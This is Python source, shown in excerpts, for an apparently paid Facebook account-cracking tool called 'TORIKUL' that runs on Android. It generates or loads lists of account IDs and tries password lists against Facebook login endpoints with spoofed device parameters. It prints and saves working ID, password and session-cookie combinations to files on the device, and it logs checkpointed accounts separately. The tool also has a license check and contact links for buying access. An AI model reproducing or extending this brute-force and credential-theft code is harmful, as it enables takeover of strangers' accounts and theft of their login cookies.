...
#─━─━─━─━COLOUR SYS━─━─━─━─#
sys.stdout.write('\x1b]2; TORIKUL\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
██   ██ ███████ ██   ██                  ██    
\033[1;37m==============================================
\033[92;1m(>  \033[1;37mOwner         \033[1;32m :    \033[1;91mT \033[1;33mO \033[92;1mR \033[1;34mK \033[1;35mL \033[1;37m
\033[92;1m(>  \033[1;37mFacebook      \033[1;32m :\033[1;97m   TORIKUL ISL
\033[92;1m(>  \033[1;37mGithub        \033[1;32m : \033[1;97m  mdtarik417
...
def mang_check():
  ...
  id = "TORIKUL"+"M".join(uuid)
  os.system("clear")
  print(logo)
  try: 
    httpCaht = requests.get("https://github.com/Mdtaeik417/TORIKUL-PAID1/blob/main/Torikul.txt").text 
    if id in httpCaht: 
      ...
      time.sleep(2)
      clear()
      print("\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m WELCOME TO OUR TORIKUL TOOLS \033[1;37m ENJOY ")
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      ...
      os.system("xdg-open https://wa.me/+8801757197599?text="+id)
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Example:\033[1;37m /sdcard/TORIKUL.txt ')
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R}[TORIKUL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TORIKUL/TORIKUL_OK_CookiE_ids_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r{A}[TORIKUL-CP] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/TORIKUL/TORIKUL_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
#─━─━─━─━FILE-M2─━─━─━─━─#
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\33[1;32m[TORIKUL]\033[1;37m-\33[1;32m[M\033[1;37m2\33[1;32m]\033[1;37m <=> \33[1;32m[{loop}\033[1;37m/\33[1;32m{len(self.id)}]\033[1;37m <=> \33[1;32mOK \033[1;37m➣\033[1;32m {len(oks)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R}[TORIKUL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TORIKUL_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YousuF_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r{A}[TORIKUL-CP] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/TORIKUL_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
#─━─━─━─━FILE-M3─━─━─━─━─#
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\33[1;32m[TORIKUL]\033[1;37m-\33[1;32m[M\033[1;37m3\33[1;32m]\033[1;37m<> \33[1;32m[{loop}\033[1;37m/\33[1;32m{len(self.id)}]\033[1;37m <>\33[1;32mOK \033[1;37m:\033[1;32m {len(oks)} ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
def admin():
			...
			if YM in ['A','1']:os.system("xdg-open https://wa.me/+8801757197599")				
			if YM in ['B','2']:os.system("xdg-open https://www.facebook.com/profile.php?id=100046155324090 ")				
			if YM in ['C','3']:os.system("xdg-open t.me/Mdtarik417")				
...
def tutorial():
			...
			linex()
			YM=input(f'\033[92;1m[<+>]\033[1;37m SELECT OPTION   :\033[92;1m ')
			if YM in ['A','1']:os.system("xdg-open https://www.facebook.com/profile.php?id=100046155324090 ")				
			if YM in ['B','2']:os.system("xdg-open t.me/Mdtarik417 ")				
...
def rndafg():
    ...
    with YousuFYousuF(max_workers=30) as YousuF:
        ...
        for love in user:
            ...
            ids = code+love
            if mthdx in ['A','1']: TORIKUL.submit(rnd1,ids,pwx,tl)            	
            if mthdx in ['B','2']: TORIKUL.submit(api2,ids,pwx,tl)          	
            if mthdx in ['C','3']: TORIKUL.submit(graph,ids,pwx,tl)            	
            if mthdx in ['D','4']: TORIKUL.submit(graph2,ids,pwx)                        	            
    print('\033[1;37m')
    linex()
    print(f'\33[1;37m\33[1;32m THE PROCESS HAS COMPLETED ')
    print(f'\33[1;37m\33[1;32m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def rnd1(ids,pwv,tl):
    ...
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r\33[1;37m\33[1;37m[TORIKUL]\033[1;37m-\33[1;32m[M\033[1;37m1\33[1;32m]\033[1;37m<>\33[1;32m [{loop}\033[1;37m/\33[1;32m{tl}] \033[1;37m<>\33[1;32mOK \033[1;37m: \033[1;32m{len(oks)}');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;37m[TORIKUL]-[OK]\33[1;37m '+ids+' \033[1;30m|\033[1;32m '+pas+'\33[1;37m')
                print(f'\r\33[1;37m[CookiE]-[OK]\33[1;32m '+kuki+'')
                linex()
                open('/sdcard/TORIKUL/TORIKUL-RANDOM-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
            	#print(ids,pas)
...
def rnd2(ids,pwv,tl):
    global loop,oks,cps,twf
    sys.stdout.write(f'\r\33[1;37m\33[1;37m[TORIKUL]\033[1;37m-\33[1;32m[M\033[1;37m2\33[1;32m]\033[1;37m<>\33[1;32m [%s\033[1;37m/\33[1;32m{tl}] \033[1;37m<>\33[1;32mOK \033[1;37m:\033[1;32m %s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    try:
        for pas in pwv:
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
            ...
            if 'access_token' in po:
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\033[1;32m[TORIKUL]-[OK] '+ids+' | '+pas+'\033[1;92m')
               # print("\r\r\033[1;34m[ðŸª\033[1;34m]\033[1;32m :\033[1;37m {kuki}")
                oks.append(ids)
                open('//sdcard/TORIKUL/TORIKUL--OK.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/TORIKUL/TORIKUL--COOKIE','a').write(ids+' | '+pas+' | '+kuki+'\n')
                break
                                ...
                                if ids in oks:pass
                                        ...
                                        print('\r\r\033[1;30m[TORIKUL]-[CP] \033[1;30m'+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TORIKUL/TORIKUL-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
            	#print(ids,pas)
